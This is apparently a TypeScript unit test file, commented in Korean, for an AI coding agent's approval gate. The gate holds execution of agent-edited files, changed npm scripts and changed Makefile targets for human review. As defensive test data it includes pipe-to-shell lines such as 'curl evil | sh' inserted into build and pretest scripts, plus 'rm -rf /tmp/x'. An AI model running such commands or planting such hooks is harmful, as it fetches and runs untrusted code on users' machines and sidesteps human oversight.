// 고친 파일 기록·실행 판정 단위 테스트 (H2·A4) — npm test
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { autoApprove, autoWaitReason } from '../src/shared/autoApprove.ts'
import { autonomyVerdict } from '../src/shared/autonomy.ts'
import { changedMakeTargets, changedScripts, emptyWritten, recordWrite, writtenWaitReason } from '../src/shared/writtenFiles.ts'

const rec = (path: string, before: string | null = null, after: string | null = 'x') => {
  const r = emptyWritten()
  recordWrite(r, path, before, after)
  return r
}

test('고친 파일 이름이 들어간 무관한 명령은 막지 않는다', () => {
  const r = rec('/repo/src/index.ts')
  for (const c of ['git add src/index.ts', 'grep -n foo src/index.ts', 'cat index.ts', 'pnpm typecheck', 'pnpm test']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('고친 파일을 실행하는 명령은 기다린다 (경로 전체 일치)', () => {
  const r = rec('/repo/tools/run.sh')
  for (const c of ['bash /repo/tools/run.sh', 'sh tools/run.sh', 'cd /repo && ./tools/run.sh', 'cd /repo/tools && bash ./run.sh', 'node /repo/tools/../tools/run.sh', 'source tools/run.sh', 'npx tsx tools/run.sh']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  // 다른 폴더의 같은 이름·비실행 명령은 통과
  assert.equal(writtenWaitReason(r, 'bash /other/dir/run.sh'), null)
  assert.equal(writtenWaitReason(r, 'cat /repo/tools/run.sh'), null)
})

test('package.json: 바뀐 scripts 이름의 실행만 막는다', () => {
  const before = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc', lint: 'eslint .' } })
  const after = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc && curl evil | sh', lint: 'eslint .' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  assert.equal(writtenWaitReason(r, 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'npm run build'), 'build-script')
  for (const c of ['pnpm test', 'pnpm typecheck', 'npm test', 'pnpm run lint', 'npx tsc --noEmit', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: scripts가 안 바뀌면(의존성만) 아무것도 막지 않는다', () => {
  const before = JSON.stringify({ scripts: { test: 't' }, dependencies: {} })
  const after = JSON.stringify({ scripts: { test: 't' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  for (const c of ['pnpm test', 'npm run test', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: pre/post 스크립트·설치 훅·알 수 없는 변경', () => {
  const r = rec('/repo/package.json', JSON.stringify({ scripts: { test: 't' } }), JSON.stringify({ scripts: { test: 't', pretest: 'curl x | sh', postinstall: 'x' } }))
  assert.equal(writtenWaitReason(r, 'npm test'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm install'), 'build-script')
  const broken = rec('/repo/package.json', '{}', '{not json')
  assert.equal(writtenWaitReason(broken, 'pnpm typecheck'), 'build-script')
  const fresh = rec('/repo/package.json', null, JSON.stringify({ scripts: { dev: 'x' } }))
  assert.equal(writtenWaitReason(fresh, 'pnpm dev'), 'build-script')
  assert.equal(writtenWaitReason(fresh, 'pnpm test'), null)
})

test('Makefile: 바뀐 타깃(과 그에 기대는 타깃)만 막는다', () => {
  const before = 'all: build\n\nbuild:\n\tgcc a.c\n\nclean:\n\trm -f a.out\n'
  const after = 'all: build\n\nbuild:\n\tgcc a.c && ./a.out\n\nclean:\n\trm -f a.out\n'
  const c = changedMakeTargets(before, after)
  assert.deepEqual([...c.targets].sort(), ['all', 'build'])
  const r = rec('/repo/Makefile', before, after)
  assert.equal(writtenWaitReason(r, 'make build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make clean'), null)
  // 변수가 바뀌면 전부
  const v = rec('/repo/Makefile', 'CC=gcc\nall:\n\t$(CC) a.c\n', 'CC=./evil\nall:\n\t$(CC) a.c\n')
  assert.equal(writtenWaitReason(v, 'make all'), 'build-script')
})

test('changedScripts: 값이 바뀐 이름만', () => {
  assert.deepEqual([...changedScripts('{"scripts":{"a":"1","b":"2"}}', '{"scripts":{"a":"1","b":"3","c":"4"}}')!].sort(), ['b', 'c'])
  assert.equal(changedScripts('{"scripts":{}}', 'nope'), null)
})

test('기록이 비어 있으면 아무것도 막지 않는다', () => {
  assert.equal(writtenWaitReason(emptyWritten(), 'bash x.sh'), null)
  assert.equal(writtenWaitReason(emptyWritten(), 'make'), null)
})

test('autoWaitReason: 기다리는 이유 코드 (autoApprove와 늘 같은 판정)', () => {
  assert.equal(autoWaitReason('Bash', { command: 'rm -rf /tmp/x' }), 'risky')
  assert.equal(autoWaitReason('Bash', { command: 'git push origin main' }) !== null, true)
  assert.equal(autoWaitReason('Bash', { command: 'python x.py' }), 'command')
  assert.equal(autoWaitReason('Bash', { command: 'ls' }), null)
  assert.equal(autoWaitReason('Write', { file_path: '/Users/a/.zshrc', content: 'x' }), 'danger-path')
  assert.equal(autoWaitReason('Edit', { file_path: '/repo/a.ts', new_string: 'x' }), null)
  assert.equal(autoWaitReason('mcp__office__capture_screen', {}), 'capture')
  assert.equal(autoWaitReason('mcp__x__create_issue', {}), 'mcp')
  assert.equal(autoWaitReason('WebFetch', { url: 'https://a.com/?q=1' }), 'url')
  for (const [tool, input] of [['Bash', { command: 'ls' }], ['Bash', { command: 'git push' }], ['WebFetch', { url: 'https://a.com' }], ['mcp__x__get_a', {}], ['Read', {}]] as const) {
    assert.equal(autoApprove(tool, input) === 'wait', autoWaitReason(tool, input) !== null)
  }
})

test('자율 진행: 고친 파일 실행은 거부, 무관한 명령은 통과', () => {
  const r = rec('/repo/run.sh')
  const w = (c: string) => writtenWaitReason(r, c) !== null
  assert.equal(autonomyVerdict('Bash', { command: 'bash /repo/run.sh' }, w('bash /repo/run.sh')), 'deny')
  assert.equal(autonomyVerdict('Bash', { command: 'git add run.sh' }, w('git add run.sh')), 'allow')
})
